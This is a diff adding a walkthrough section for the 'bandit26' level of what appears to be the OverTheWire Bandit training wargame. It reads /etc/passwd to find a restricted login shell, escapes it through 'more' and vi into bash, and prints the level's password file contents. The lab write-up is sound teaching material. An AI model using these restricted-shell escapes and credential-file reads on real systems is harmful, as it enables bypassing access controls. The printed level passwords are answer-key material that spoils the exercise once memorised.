@@ -488,3 +488,30 @@ The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 
 Exiting.
 ```
+
+## bandit26
+Use the provided sshkey to login to bandit26 and break out of the custom shell. When logging into bandit26, custom text is shown, and we are immediately kicked out. One way to find the shell of a user is to `cat /etc/passwd`.
+```bash
+$ cat /etc/passwd
+...
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+...
+
+$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+To break out of `more`, we can shrink the terminal to keep `more` from exiting, then start `vi`. After starting `vi`, we can set the shell and start `bash` to get the password.
+```vim
+:set shell=bash
+:shell
+```
+
+```bash
+$ cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
